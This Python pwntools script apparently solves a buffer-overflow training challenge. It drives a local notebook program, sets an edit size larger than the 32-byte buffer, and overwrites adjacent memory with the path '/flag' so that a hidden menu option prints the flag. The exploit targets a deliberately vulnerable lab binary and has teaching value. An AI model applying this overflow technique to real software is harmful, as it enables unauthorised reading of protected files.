#!/usr/bin/python

import pwn

def readlines(proc):
    try:
        lines = proc.recvlines(timeout=0.01)
        for line in lines:
            print(line.decode())
    except:
        pass

proc = pwn.process("/challenge/buffer-overflow-level2.0")
readlines(proc)

payload = b"1"
proc.sendline(payload) # create_notebook
print(payload)
readlines(proc)
payload = pwn.cyclic(0x20)
proc.send_raw(payload)
print(payload)
readlines(proc)

payload = b"2"
proc.sendline(payload) # edit_notebook
print(payload)
readlines(proc)
payload = b"48"
proc.sendline(payload) # edit size
print(payload)
readlines(proc)

payload = pwn.cyclic(0x20)
payload += b"/flag\x00"
proc.send_raw(payload)
print(payload)
readlines(proc)

payload = b"666"
proc.sendline(payload) # read_notebook
print(payload)
print(proc.recv())